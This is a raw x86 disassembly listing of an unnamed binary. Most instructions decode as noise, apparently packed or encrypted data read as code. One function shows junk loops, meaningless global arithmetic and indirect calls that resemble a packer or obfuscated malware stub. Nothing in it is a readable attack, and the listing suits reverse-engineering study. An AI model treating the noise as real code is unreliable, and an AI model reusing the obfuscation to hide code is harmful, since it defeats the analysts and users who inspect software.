  406921:	xchg   BYTE PTR [edi],bh
  406923:	push   ebp
  406924:	sub    BYTE PTR [ecx+0x47],bh
  406927:	into   
  406928:	adc    eax,0xfffffffd
  40692b:	clts   
  40692d:	(bad)  
  40692e:	fisttp WORD PTR [edx+eiz*1]
  406931:	mov    al,0xd3
  406933:	loope  0x406914
  406935:	idiv   BYTE PTR ss:[ebx]
  406938:	mov    eax,0x11f8361b
  40693d:	push   esp
  40693e:	mov    dh,0x36
  406940:	mov    ?,edi
  406942:	and    cl,BYTE PTR [esp+ebx*4+0x78d7d9d3]
  406949:	pop    es
  40694a:	lds    ebp,FWORD PTR [ecx-0x3f68b0e]
  406950:	mov    edx,0x73c1cc29
  406955:	out    dx,al
  406956:	and    ebp,DWORD PTR [esi+0x44]
  406959:	adc    esp,DWORD PTR [edx+0x1]
  40695c:	push   edi
  40695d:	jp     0x406965
  40695f:	and    bl,BYTE PTR [ebx]
  406961:	mov    ebp,0x9af37b7c
  406966:	idiv   edi
  406968:	cdq    
  406969:	jp     0x406983
  40696b:	shl    DWORD PTR cs:[ebp+0x3cc2d7fc],cl
  406972:	arpl   cx,cx
  406974:	xchg   esp,eax
  406975:	xchg   ebx,eax
  406976:	hlt    
  406977:	sbb    ebx,edx
  406979:	sbb    al,ah
  40697b:	xchg   edx,eax
  40697c:	dec    edx
  40697d:	xchg   esp,eax
  40697e:	sti    
  40697f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406980:	outs   dx,BYTE PTR ds:[esi]
  406981:	inc    edi
  406982:	js     0x406964
  406984:	(bad)  
  406985:	shl    DWORD PTR [ebx+0x3d28e02c],cl
  40698b:	enter  0x3b4a,0x8b
  40698f:	pop    ecx
  406990:	out    dx,eax
  406991:	mov    ecx,0x4bd0e438
  406996:	mov    gs,WORD PTR [esi-0x7b4be4bb]
  40699c:	mov    dl,0xe8
  40699e:	rcr    dl,cl
  4069a0:	stos   DWORD PTR es:[edi],eax
  4069a1:	arpl   WORD PTR [ebp-0x45ff936c],sp
  4069a7:	pop    edi
  4069a8:	call   0x358a:0xc166c84f
  4069af:	dec    edx
  4069b0:	jo     0x40695e
  4069b2:	stc    
  4069b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069b4:	and    eax,0xea5e1c1b
  4069b9:	xor    eax,0xdefc308a
  4069be:	loope  0x406a02
  4069c0:	sbb    bh,cl
  4069c2:	inc    edx
  4069c3:	inc    ecx
  4069c4:	cmp    dl,BYTE PTR [edx]
  4069c6:	repz inc eax
  4069c8:	dec    ebp
  4069c9:	fidivr WORD PTR [ebx-0x20]
  4069cc:	mov    ds:0x38241eba,eax
  4069d1:	adc    BYTE PTR [ecx+0x534b533d],dl
  4069d7:	loopne 0x406a27
  4069d9:	gs loopne 0x4069e7
  4069dc:	mov    al,ds:0x85237213
  4069e1:	cwde   
  4069e2:	in     al,dx
  4069e3:	in     eax,0x16
  4069e5:	inc    ebx
  4069e6:	mov    al,ds:0x28a7e23c
  4069eb:	mov    edi,0xb1984933
  4069f0:	cmp    eax,0x96ab4c2e
  4069f5:	rol    BYTE PTR [ebx-0x12],1
  4069f8:	(bad)  
  4069f9:	adc    al,0xd4
  4069fb:	sub    eax,0xe398ca72
  406a00:	call   0xf891:0x450ecfc3
  406a07:	scas   eax,DWORD PTR es:[edi]
  406a08:	mov    WORD PTR [ecx],cs
  406a0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a0b:	out    dx,eax
  406a0c:	mov    al,BYTE PTR [eax]
  406a0e:	fld    QWORD PTR [edx-0x5c]
  406a11:	stos   DWORD PTR es:[edi],eax
  406a12:	mov    al,ds:0x7c5de771
  406a17:	xor    ebp,edx
  406a19:	or     BYTE PTR [edi+ebp*1],dl
  406a1c:	stc    
  406a1d:	ja     0x4069d7
  406a1f:	inc    eax
  406a20:	(bad)  
  406a21:	outs   dx,BYTE PTR ds:[esi]
  406a22:	or     al,0xb8
  406a24:	fadd   DWORD PTR [eax-0x3d156f72]
  406a2a:	mov    bh,0xcd
  406a2c:	pop    esp
  406a2d:	sahf   
  406a2e:	out    dx,eax
  406a2f:	mov    esp,0x6f3b457b
  406a34:	repnz ss out 0x16,al
  406a38:	lahf   
  406a39:	sub    eax,0xbf230366
  406a3e:	mul    DWORD PTR [edi]
  406a40:	aam    0xf2
  406a42:	mov    ebx,0x5aba7c93
  406a47:	jmp    0x946bf851
  406a4c:	pop    eax
  406a4d:	fisttp DWORD PTR [ecx+0x23]
  406a50:	pop    edx
  406a51:	outs   dx,DWORD PTR ds:[esi]
  406a52:	mov    ds:0xb7b3cd83,eax
  406a57:	sub    BYTE PTR [edi-0x6156ff35],ah
  406a5d:	ret    0x86e8
  406a60:	fmul   QWORD PTR [edx-0x46698df8]
  406a66:	lods   eax,DWORD PTR ds:[esi]
  406a67:	test   eax,0x270128db
  406a6c:	addr16 iret 
  406a6e:	pushf  
  406a6f:	mov    ecx,0x2a03e239
  406a74:	pop    esp
  406a75:	pop    edx
  406a76:	cdq    
  406a77:	dec    ebx
  406a78:	jae    0x406a01
  406a7a:	fs jae 0x406a3b
  406a7d:	je     0x406ace
  406a7f:	and    ebp,esp
  406a81:	push   es
  406a82:	inc    esp
  406a83:	(bad)  
  406a84:	mov    dl,0x8f
  406a86:	jmp    0xacc65db1
  406a8b:	adc    al,0xbc
  406a8d:	and    al,0xe7
  406a8f:	rcl    cl,1
  406a91:	xor    DWORD PTR [ebx],0x58
  406a94:	and    eax,0x4b3f61cf
  406a99:	adc    ecx,ecx
  406a9b:	pop    ebx
  406a9c:	cmp    eax,0x4be278ff
  406aa1:	mov    ecx,0x62de9c1a
  406aa6:	mov    eax,0xa727d907
  406aab:	fs jge 0x406afc
  406aae:	jge    0x406ad4
  406ab0:	xchg   ebx,eax
  406ab1:	or     ecx,DWORD PTR [edi+eax*4-0x1e]
  406ab5:	std    
  406ab6:	adc    eax,0x32440ad2
  406abb:	imul   edx,DWORD PTR [eax],0xffffff88
  406abe:	push   edi
  406abf:	pop    ebp
  406ac0:	xor    eax,ecx
  406ac2:	add    eax,0x32729c
  406ac7:	leave  
  406ac8:	ret    0x1c
  406acb:	push   ebp
  406acc:	mov    ebp,esp
  406ace:	sub    esp,0x78
  406ad1:	mov    eax,ds:0x41b1a8
  406ad6:	mov    DWORD PTR [ebp-0x10],eax
  406ad9:	mov    eax,ds:0x41b2b4
  406ade:	sub    DWORD PTR ds:0x42e6fb,0x487f
  406ae8:	mov    DWORD PTR [ebp-0x30],eax
  406aeb:	xor    DWORD PTR ds:0x42fd01,0x6d44
  406af5:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  406afc:	inc    DWORD PTR ds:0x42fcd9
  406b02:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  406b09:	sub    DWORD PTR ds:0x42e6ef,0x7e8e
  406b13:	mov    eax,DWORD PTR [ebp-0xc]
  406b16:	push   ebx
  406b17:	push   esi
  406b18:	push   edi
  406b19:	movzx  esi,WORD PTR ds:0x42fcd9
  406b20:	and    esi,DWORD PTR ds:0x42e128
  406b26:	mov    DWORD PTR ds:0x42fcd9,esi
  406b2c:	mov    esi,0x7510855
  406b31:	mov    DWORD PTR ds:0x42e6f3,0x1a
  406b3b:	cmp    DWORD PTR ds:0x42e6f3,0x0
  406b42:	je     0x406c66
  406b48:	cmp    DWORD PTR ds:0x42e6f3,0x27
  406b4f:	jne    0x406b61
  406b55:	push   DWORD PTR [ebp-0xc]
  406b58:	push   DWORD PTR [ebp-0x24]
  406b5b:	call   DWORD PTR ds:0x42e2df
  406b61:	mov    edi,DWORD PTR ds:0x42e6f3
  406b67:	dec    edi
  406b68:	mov    DWORD PTR ds:0x42e6f3,edi
  406b6e:	jmp    0x406b3b
  406b73:	mov    DWORD PTR ds:0x42fcf1,0x10
  406b7d:	cmp    DWORD PTR ds:0x42fcf1,0x0
  406b84:	je     0x406c66
  406b8a:	cmp    DWORD PTR ds:0x42fcf1,0x1c
  406b91:	jne    0x406bad
  406b97:	push   DWORD PTR [ebp-0x10]
  406b9a:	push   0x42fcfd
  406b9f:	push   0x29f4
  406ba4:	push   DWORD PTR [ebp-0x14]
  406ba7:	call   DWORD PTR ds:0x42e53f
  406bad:	mov    edi,DWORD PTR ds:0x42fcf1
  406bb3:	dec    edi
  406bb4:	mov    DWORD PTR ds:0x42fcf1,edi
  406bba:	jmp    0x406b7d
  406bbf:	and    DWORD PTR ds:0x42fce5,0x0
  406bc9:	jmp    0x406bdb
  406bce:	mov    edi,DWORD PTR ds:0x42fce5
  406bd4:	inc    edi
  406bd5:	mov    DWORD PTR ds:0x42fce5,edi
  406bdb:	cmp    DWORD PTR ds:0x42fce5,0x15
  406be2:	jae    0x406c66
  406be8:	cmp    DWORD PTR ds:0x42fce5,0x1e
  406bef:	jne    0x406c06
  406bf5:	push   DWORD PTR [ebp-0xc]
  406bf8:	push   0x42fced
  406bfd:	push   DWORD PTR [ebp-0x10]
  406c00:	call   DWORD PTR ds:0x42e45b
  406c06:	jmp    0x406bce
  406c0b:	and    DWORD PTR ds:0x42fd76,0x0
  406c15:	mov    edi,DWORD PTR ds:0x42fd76
  406c1b:	inc    edi
  406c1c:	mov    DWORD PTR ds:0x42fd76,edi
  406c22:	cmp    DWORD PTR ds:0x42fd76,0x5
  406c29:	jne    0x406c3f
  406c2f:	push   0x42e707
  406c34:	push   0x42e1a4
  406c39:	call   DWORD PTR ds:0x42e543
  406c3f:	cmp    DWORD PTR ds:0x42fd76,0x4
  406c46:	jne    0x406c59
  406c4c:	mov    edi,DWORD PTR ds:0x42fd76
  406c52:	inc    edi
  406c53:	mov    DWORD PTR ds:0x42fd76,edi
  406c59:	cmp    DWORD PTR ds:0x42fd76,0x1b
  406c60:	jb     0x406c15
  406c66:	xor    eax,esi
  406c68:	sub    DWORD PTR ds:0x42e713,ecx
  406c6e:	mov    edi,0x32729c
  406c73:	add    eax,edi
  406c75:	xor    DWORD PTR ds:0x42e70b,0x42fd76
  406c7f:	mov    DWORD PTR [ebp-0x20],eax
  406c82:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  406c89:	jmp    0x406fd6
  406c8e:	inc    ecx
  406c8f:	jae    0x406d0b
  406c91:	pop    ebp
  406c92:	sub    dh,BYTE PTR [ebp+0x61]
  406c95:	jae    0x406ce4
  406c97:	and    ebp,DWORD PTR [eax]
  406c99:	mov    bh,0x35
  406c9b:	dec    ebp
  406c9c:	mov    ebp,0x70c51782
  406ca1:	jo     0x406cc3
  406ca3:	jge    0x406d15
  406ca5:	jo     0x406d05
  406ca7:	ins    DWORD PTR es:[edi],dx
  406ca8:	mov    gs,ebx
  406caa:	jle    0x406c9e
  406cac:	sub    ebp,DWORD PTR [ebx]
  406cae:	rol    BYTE PTR [edx],cl
  406cb0:	scas   al,BYTE PTR es:[edi]
  406cb1:	push   ebp
  406cb2:	cmp    ch,BYTE PTR [eax-0x6fed4c66]
  406cb8:	les    edx,FWORD PTR [ebp-0x66]
  406cbb:	and    esi,DWORD PTR [ecx-0x5c97e07d]
  406cc1:	lods   eax,DWORD PTR ds:[esi]
  406cc2:	pop    ss
  406cc3:	and    ebx,esi
  406cc5:	sbb    esi,DWORD PTR [esi-0x6b]
  406cc8:	xchg   edi,eax
  406cc9:	(bad)  
  406cca:	dec    ebp
  406ccb:	lea    esp,[edx+0x58]
  406cce:	fsub   DWORD PTR [edx]
  406cd0:	in     al,0xac
  406cd2:	fst    DWORD PTR fs:[esp+edx*1]
  406cd6:	sbb    BYTE PTR [ebp+0xf32db07],bh
  406cdc:	dec    esi
  406cdd:	push   ds
  406cde:	lds    edi,FWORD PTR [ecx-0x31]
  406ce1:	fisttp QWORD PTR [ebx+ecx*1]
  406ce4:	(bad)  
  406ce5:	outs   dx,BYTE PTR ds:[esi]
  406ce6:	cmp    DWORD PTR [ecx+0x5f],edx
  406ce9:	test   BYTE PTR [ecx+0x6c],ah
  406cec:	xor    BYTE PTR [eax-0x35ff1d4],bh
  406cf2:	xchg   ebp,eax
  406cf3:	cmp    BYTE PTR [esi-0x24e9f01],bl
  406cf9:	cld    
  406cfa:	cmp    esi,ecx
  406cfc:	(bad)  
  406cfd:	stc    
  406cfe:	fld    QWORD PTR [ecx-0x48]
  406d01:	cmp    ch,BYTE PTR [edx]
  406d03:	test   BYTE PTR [edi+esi*2+0x55],bl
  406d07:	xlat   BYTE PTR ds:[ebx]
  406d08:	mov    esp,0x9e612bb6
  406d0d:	outs   dx,DWORD PTR ds:[esi]
  406d0e:	adc    dh,dl
  406d10:	xor    al,0x25
  406d12:	mov    BYTE PTR [ebx+ebp*1],dl
  406d15:	add    al,BYTE PTR [eax+ebx*4]
  406d18:	js     0x406d94
  406d1a:	mov    ch,BYTE PTR [ebx+0x6e1c78ca]
  406d20:	jne    0x406d1a
  406d22:	std    
  406d23:	jae    0x406d30
  406d25:	adc    eax,0xc0d1d92f
  406d2a:	pop    esp
  406d2b:	sub    BYTE PTR [esi],dh
  406d2d:	mov    DWORD PTR [eax+eax*1-0x2f],esp
  406d31:	cmp    al,0x1d
  406d33:	leave  
  406d34:	or     DWORD PTR [ebp+0x2ca62ded],0xad5ed1b2
  406d3e:	xchg   esp,eax
  406d3f:	jbe    0x406ce8
  406d41:	aaa    
  406d42:	mov    ds:0x3129163f,al
  406d47:	pop    ecx
  406d48:	out    dx,eax
  406d49:	mov    dh,0x5
  406d4b:	lahf   
  406d4c:	fldenv [eax]
  406d4e:	hlt    
  406d4f:	pop    edx
  406d50:	pop    ds
  406d51:	test   BYTE PTR [esi],al
  406d53:	jne    0x406d63
  406d55:	xlat   BYTE PTR ds:[ebx]
  406d56:	or     eax,0xcd0f8bd4
  406d5b:	mov    ah,0x3d
  406d5d:	jmp    0x406d53
  406d5f:	pop    DWORD PTR [esi+0x69]
  406d62:	in     al,0x20
  406d64:	fisub  WORD PTR [eax-0x40f025ff]
  406d6a:	push   edi
  406d6b:	jmp    0x406da2
  406d6d:	jg     0x406db6
  406d6f:	(bad)  
  406d70:	sub    eax,0xa7a8ffa3
  406d75:	add    BYTE PTR [esi],dl
  406d77:	mov    cl,0x3c
  406d79:	cli    
  406d7a:	ror    BYTE PTR [ebx],0x10
  406d7d:	jae    0x406df2
  406d7f:	add    DWORD PTR [esi+0x52],0x18
  406d83:	sub    dh,BYTE PTR [eax+0x101543c8]
  406d89:	aas    
  406d8a:	loop   0x406d1e
  406d8c:	adc    bh,bl
  406d8e:	adc    dh,BYTE PTR [edx]
  406d90:	ja     0x406dda
  406d92:	jl     0x406d56
  406d94:	adc    DWORD PTR [edx-0x463725ae],edx
  406d9a:	adc    eax,0x8
  406d9d:	(bad)  
  406d9e:	sub    al,0xa3
  406da0:	icebp  
  406da1:	cmp    eax,0x17426313
  406da6:	inc    ebp
  406da7:	fidiv  WORD PTR [edx+0x56]
  406daa:	cmp    eax,0xfc68b7f4
  406daf:	shr    BYTE PTR [eax+esi*4+0x774407c1],0x28
  406db7:	xchg   ebx,eax
  406db8:	std    
  406db9:	mov    bh,0x8c
  406dbb:	jle    0x406e1a
  406dbd:	and    eax,DWORD PTR ds:0x4eac11ff
  406dc3:	mov    edi,0xd0d39d4d
  406dc8:	mov    cl,0x7
  406dca:	inc    edi
  406dcb:	cmp    ebx,DWORD PTR [eax+0x54]
  406dce:	push   0xffffffeb
  406dd0:	leave  
  406dd1:	frstor [ebp+0x6be8b61a]
  406dd7:	mov    eax,0x126631f8
  406ddc:	jno    0x406d83
  406dde:	inc    ecx
  406ddf:	jg     0x406dfa
  406de1:	or     bh,BYTE PTR [edx-0x2d]
  406de4:	es inc esi
  406de6:	xlat   BYTE PTR ds:[ebx]
  406de7:	dec    ecx
  406de8:	jp     0x406d91
  406dea:	fimul  WORD PTR [ebp+0x37]
  406ded:	imul   esp,DWORD PTR [eax-0x62],0x7f
  406df1:	clc    
  406df2:	dec    ebx
  406df3:	ja     0x406e6c
  406df5:	ins    DWORD PTR es:[edi],dx
  406df6:	push   0xffffffc6
  406df8:	loopne 0x406d81
  406dfa:	jmp    0xefa3da33
  406dff:	xor    esp,edx
  406e01:	(bad)  
  406e02:	jmp    0x406dfb
  406e04:	mov    ecx,0xf46d345b
  406e09:	pop    ds
  406e0a:	or     al,BYTE PTR [esi+0x44bcee77]
  406e10:	fcomp  DWORD PTR [edx+ecx*8-0x5da023d2]
  406e17:	out    dx,eax
  406e18:	jne    0x406dbb
  406e1a:	ins    BYTE PTR es:[edi],dx
  406e1b:	js     0x406df3
  406e1d:	clc    
  406e1e:	xchg   esp,eax
  406e1f:	daa    
  406e20:	jge    0x406db7
  406e22:	lock leave 
  406e24:	jecxz  0x406e51
  406e26:	mov    cl,bl
  406e28:	jl     0x406e9a
  406e2a:	gs inc ecx
  406e2c:	sti    
  406e2d:	js     0x406e9b
  406e2f:	sbb    ch,BYTE PTR [esi]
  406e31:	sub    ebx,DWORD PTR [edi+edi*1]
  406e34:	outs   dx,DWORD PTR ds:[esi]
  406e35:	push   esp
  406e36:	fistp  WORD PTR [esi]
  406e38:	sbb    BYTE PTR [ecx],ch
  406e3a:	pop    ebx
  406e3b:	stos   BYTE PTR es:[edi],al
  406e3c:	push   0x5a6ee5f4
  406e41:	sbb    BYTE PTR [eax+0x6f30d4b1],ah
  406e47:	aas    
  406e48:	xchg   ebp,eax
  406e49:	imul   edx,DWORD PTR gs:[eax+edi*4],0xffffffc7
  406e4e:	(bad)  
  406e51:	push   edx
  406e52:	mov    ds,eax
  406e54:	test   al,0xa4
  406e56:	xchg   BYTE PTR [edi+0x13],dh
  406e59:	push   ds
  406e5a:	push   eax
  406e5b:	xor    BYTE PTR [eax-0x9],al
  406e5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e5f:	add    eax,0xde8cd8f6
  406e64:	adc    BYTE PTR [ebx],0xb
  406e67:	cli    
  406e68:	adc    ebx,DWORD PTR [eax+0x52]
  406e6b:	dec    esp
  406e6c:	stos   BYTE PTR es:[edi],al
  406e6d:	xchg   edx,eax
  406e6e:	mov    esp,0x50e2221
  406e73:	out    dx,al
  406e74:	(bad)  
  406e75:	jmp    0xf433:0x54d17baa
  406e7c:	or     al,0x26
  406e7e:	stc    
  406e7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e80:	xchg   ebp,eax
  406e81:	jne    0x406e7e
  406e83:	shr    DWORD PTR [ecx+0x6777e42d],cl
  406e89:	dec    esp
  406e8a:	add    ebp,eax
  406e8c:	stc    
  406e8d:	test   DWORD PTR [ebx+eax*8],esp
  406e90:	ret    
  406e91:	cmp    bl,BYTE PTR [esi-0x3961daa6]
  406e97:	es jae 0x406ef2
  406e9a:	test   BYTE PTR [ebp+0x2b],dh
  406e9d:	fidiv  DWORD PTR [esi-0x73d55d76]
  406ea3:	mov    dh,0xb9
  406ea5:	sub    BYTE PTR [ecx*2-0x5ab0c318],dl
  406eac:	and    DWORD PTR [esi+eax*1],0xffffff94
  406eb0:	fs sbb eax,0x53464dac
  406eb6:	xlat   BYTE PTR ds:[ebx]
  406eb7:	dec    ecx
  406eb8:	cmp    eax,0x2c12e051
  406ebd:	test   edi,edx
  406ebf:	int    0x32
  406ec1:	and    BYTE PTR [ebp-0x4b],0x3c
  406ec5:	xchg   DWORD PTR [edx+0x5c96b523],edx
  406ecb:	mov    DWORD PTR [edi+0x56],eax
  406ece:	sti    
  406ecf:	sar    ecx,cl
  406ed1:	ficomp WORD PTR [edx-0x18d1e83b]
  406ed7:	and    eax,0xb6daf589
  406edc:	gs xchg ebx,eax
  406ede:	jle    0x406eec
  406ee0:	and    BYTE PTR [ecx+0x5e6fce97],0xd8
  406ee7:	cmc    
  406ee8:	push   ebx
  406ee9:	rcr    DWORD PTR [ebp-0xe827577],0xc0
  406ef0:	pop    ss
  406ef1:	mov    eax,0x354ea2ca
  406ef6:	mov    bh,ah
  406ef8:	xor    BYTE PTR [edx],bh
  406efa:	sbb    eax,0xaa9001cc
  406eff:	or     bh,bh
  406f01:	xlat   BYTE PTR ds:[ebx]
  406f02:	sbb    al,0x34
  406f04:	mov    esp,0x9694e86b
  406f09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f0a:	sbb    DWORD PTR [eax],esi
  406f0c:	mov    bh,0x57
  406f0e:	mov    dl,0x7
  406f10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f11:	jecxz  0x406ea4
  406f13:	add    eax,0x46791f02
  406f18:	adc    BYTE PTR [edi-0x23ca85ca],ch
  406f1e:	not    BYTE PTR [eax+edi*4]
  406f21:	test   al,0xbe
  406f23:	cld    
  406f24:	cmp    DWORD PTR [ecx],edi
  406f26:	mov    bl,0x5d
  406f28:	adc    al,0x47
  406f2a:	bound  esp,QWORD PTR [ecx]
  406f2c:	test   al,0x28
  406f2e:	mov    al,ds:0x725dd90e
  406f33:	push   0x34
  406f35:	das    
  406f36:	fst    QWORD PTR [ecx+0x6657478d]
  406f3c:	fld    TBYTE PTR [edi]
  406f3e:	lds    eax,FWORD PTR [ecx]
  406f40:	add    ebp,DWORD PTR ds:0xd800551c
  406f46:	lock jo 0x406f99
  406f49:	shl    DWORD PTR [esi-0x1da94d68],cl
  406f4f:	rcr    eax,1
  406f51:	js     0x406f53
  406f53:	retf   
  406f54:	(bad)  
  406f56:	jg     0x406f4b
  406f58:	sbb    BYTE PTR [ebx-0x2d],al
  406f5b:	pop    esi
  406f5c:	pop    es
  406f5d:	mov    ds:0x7cfd569,eax
  406f62:	nop
  406f63:	imul   esi,DWORD PTR [edi+0x7d6c80ec],0xffffffc0
  406f6a:	add    DWORD PTR [edi],0xffffffcc
  406f6d:	mov    ah,0xc1
  406f6f:	loopne 0x406fd3
  406f71:	cwde   
  406f72:	cmp    al,0x7a
  406f74:	adc    cl,BYTE PTR [edx]
  406f76:	push   edx
  406f77:	mov    ah,0x66
  406f79:	pop    edi
  406f7a:	test   BYTE PTR [eax],cl
  406f7c:	cdq    
  406f7d:	dec    esi
  406f7e:	sub    BYTE PTR [edi-0x3e],cl
  406f81:	inc    edx
  406f82:	cmp    DWORD PTR [esi+0x29],ebp
  406f85:	adc    eax,0x440e7440
  406f8a:	push   0xffffffc1
  406f8c:	mov    ebp,0x392e3f55
  406f91:	mov    ds:0x1b7a95e7,eax
  406f96:	ins    DWORD PTR es:[edi],dx
  406f97:	clc    
  406f98:	fld    DWORD PTR [ebx-0x61]
  406f9b:	rcl    DWORD PTR [ebx-0x2b],0xe3
  406f9f:	popf   
  406fa0:	push   ebp
  406fa1:	addr16 leave 
  406fa3:	cmp    ch,dl
  406fa5:	shr    DWORD PTR [edx],cl
  406fa7:	mov    bl,0xf4
  406fa9:	test   eax,0x2e27af99
  406fae:	sbb    DWORD PTR [edi+0x1b],ebp
  406fb1:	fdiv   QWORD PTR [edx-0x2e]
  406fb4:	pop    eax
  406fb5:	dec    ebx
  406fb6:	xchg   esp,eax
  406fb7:	fsub   st(0),st
  406fb9:	mov    esp,0xeafad43a
  406fbe:	push   ebx
  406fbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fc0:	jbe    0x406f58
  406fc2:	sti    
  406fc3:	xchg   edx,eax
  406fc4:	mov    ah,0xef
  406fc6:	cmc    
  406fc7:	mov    ds:0xafd4c458,al
  406fcc:	bound  esi,QWORD PTR [ebx]
  406fce:	stc    
  406fcf:	lock pop edi
  406fd1:	test   eax,0x5dafbfb9
  406fd6:	mov    DWORD PTR [ebp-0x34],0xf89f0531
  406fdd:	adc    DWORD PTR ds:0x42fd72,0x42e70b
  406fe7:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  406fee:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  406ff5:	add    eax,0xac
  406ffa:	jmp    0x407347
  406fff:	sbb    al,0x75
  407001:	sar    DWORD PTR [esi+0x71b35a51],1
  407007:	lahf   
  407008:	popa   
  407009:	sti    
  40700a:	arpl   bx,ax
  40700c:	outs   dx,BYTE PTR ds:[esi]
  40700d:	popf   
  40700e:	sub    edi,eax
  407010:	ret    0x7070
  407013:	and    BYTE PTR [ebp+0x70],bh
  407016:	jo     0x406f9c
  407018:	test   DWORD PTR [ebx-0x6768b6e5],esi
  40701e:	or     eax,0xb877392d
  407023:	or     cl,ch
  407025:	arpl   WORD PTR [ebp+0x5a],di
  407028:	mov    esp,0x6b961f31
  40702d:	mov    edx,0x8148fefe
  407032:	test   eax,0x2c7456d8
  407037:	push   edx
  407038:	pushf  
  407039:	dec    esi
  40703a:	inc    ecx
  40703b:	ficom  WORD PTR [edx]
  40703d:	fcomp  QWORD PTR [edi]
  40703f:	sbb    eax,DWORD PTR [eax-0xf]
  407042:	pop    es
  407043:	scas   ax,WORD PTR es:[edi]
  407045:	dec    edx
  407046:	mov    ds,WORD PTR [esi-0x2cd85eeb]
  40704c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40704d:	jmp    0x82a0:0x893155c6
  407054:	stc    
  407055:	and    esp,DWORD PTR [esi-0x5d]
  407058:	orps   xmm2,XMMWORD PTR [ecx]
  40705b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40705c:	popa   
  40705d:	inc    edx
  40705e:	push   edx
  40705f:	bound  ecx,QWORD PTR [eax+edx*2-0x4623386a]
  407066:	xor    al,0x72
  407068:	lods   eax,DWORD PTR ds:[esi]
  407069:	jecxz  0x40706c
  40706b:	inc    ecx
  40706c:	xlat   BYTE PTR ds:[ebx]
  40706d:	pop    esi
  40706e:	push   es
  40706f:	scas   eax,DWORD PTR es:[edi]
  407070:	in     eax,dx
  407071:	xlat   BYTE PTR ds:[ebx]
  407072:	sbb    BYTE PTR [edi+0x5c02f24a],ch
  407078:	arpl   WORD PTR [esi+0x2132010c],sp
  40707e:	aaa    
  40707f:	out    0x98,al
  407081:	pop    esp
  407082:	jg     0x4070e5
  407084:	idiv   BYTE PTR [esi-0x39]
  407087:	cmp    bl,dl
  407089:	out    0x75,al
  40708b:	cmp    al,dh
  40708d:	push   0x43
  40708f:	jae    0x4070ed
  407091:	ss popf 
  407093:	or     edi,DWORD PTR [esi]
  407095:	cmp    eax,0xac55708c
  40709a:	imul   ebp,DWORD PTR [edx+esi*1-0x73b4c6c4],0x626010f0
  4070a5:	cmp    BYTE PTR [ecx],dh
  4070a7:	sub    al,0x5a
  4070a9:	mov    al,ds:0x5c0d4ace
  4070ae:	gs jo  0x40711d
  4070b1:	push   edx
  4070b2:	mov    al,0x5b
  4070b4:	sbb    esp,DWORD PTR [eax]
  4070b6:	stos   DWORD PTR es:[edi],eax
  4070b7:	push   esp
  4070b8:	(bad)  
  4070b9:	cmp    DWORD PTR [esi-0x522ed4dd],esp
  4070bf:	out    dx,eax
  4070c0:	out    dx,eax
  4070c1:	(bad)  
  4070c2:	repnz and esi,DWORD PTR [ebx]
  4070c5:	out    0x33,eax
  4070c7:	pop    ds
  4070c8:	mov    esi,0xa6e0614a
  4070cd:	out    0xb8,eax
  4070cf:	push   ebx
  4070d0:	fdiv   DWORD PTR [ecx]
  4070d2:	popa   
  4070d3:	jecxz  0x407070
  4070d5:	xchg   ecx,eax
  4070d6:	adc    cl,dl
  4070d8:	lds    ebp,FWORD PTR [edi]
  4070da:	fidiv  DWORD PTR [eax]
  4070dc:	daa    
  4070dd:	mov    ecx,0x8e22ae1c
  4070e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070e3:	add    ecx,DWORD PTR [eax]
  4070e5:	inc    eax
  4070e6:	jno    0x40710b
  4070e8:	or     DWORD PTR [esi+esi*2-0xd],esi
  4070ec:	popa   
  4070ed:	js     0x4070cc
  4070ef:	pop    ebp
  4070f0:	push   0x7b
  4070f2:	ins    BYTE PTR es:[edi],dx
  4070f3:	pusha  
  4070f4:	in     eax,0xd8
  4070f6:	test   DWORD PTR [ecx-0x60],ebx
  4070f9:	inc    esi
  4070fa:	jecxz  0x4070a1
  4070fc:	cmp    DWORD PTR ds:0xd32015d2,0x64217619
  407106:	dec    ebp
  407107:	jp     0x4070a1
  407109:	sub    ah,ch
  40710b:	xchg   edi,eax
  40710c:	fisub  DWORD PTR [ebp-0x1b]
  40710f:	dec    ecx
  407110:	mov    WORD PTR [ecx],?
  407112:	mov    eax,esp
  407114:	and    DWORD PTR [eax+0x36],edi
  407117:	mov    eax,ds:0x9505c12b
  40711c:	lahf   
  40711d:	ret    
  40711e:	call   0xc828:0xf2748303
  407125:	jno    0x4070d7
  407127:	add    ah,bl
  407129:	inc    esi
  40712a:	adc    edx,esi
  40712c:	sbb    bl,BYTE PTR [edi]
  40712e:	fdiv   QWORD PTR [esi+0x3ddb9938]
  407134:	xchg   edx,ebp
  407136:	js     0x4070ed
  407138:	(bad)  
  407139:	or     eax,0xdbb76e69
  40713e:	push   es
  40713f:	xor    edi,DWORD PTR ds:0xd9ca30d9
  407145:	jle    0x407166
  407147:	or     DWORD PTR [edi],esp
  407149:	xchg   esp,eax
  40714a:	ret    
  40714b:	fs adc edx,edi
  40714e:	xor    ebp,esp
  407150:	not    DWORD PTR [eax-0x1c]
  407153:	leave  
  407154:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  407156:	mov    ds:0xaecc273,al
  40715b:	ret    0xb022
  40715e:	push   DWORD PTR [ebp-0x5b37740c]
  407164:	arpl   WORD PTR ds:[edi-0x21],si
  407168:	pop    ds
  407169:	jecxz  0x407197
  40716b:	(bad)  
  40716c:	pop    edx
  40716d:	ret    0xc7c4
  407170:	cdq    
  407171:	jns    0x407105
  407173:	icebp  
  407174:	inc    ebp
  407175:	xchg   ecx,eax
  407176:	scas   eax,DWORD PTR es:[edi]
  407177:	or     eax,0x2a8e76c8
  40717c:	and    eax,edi
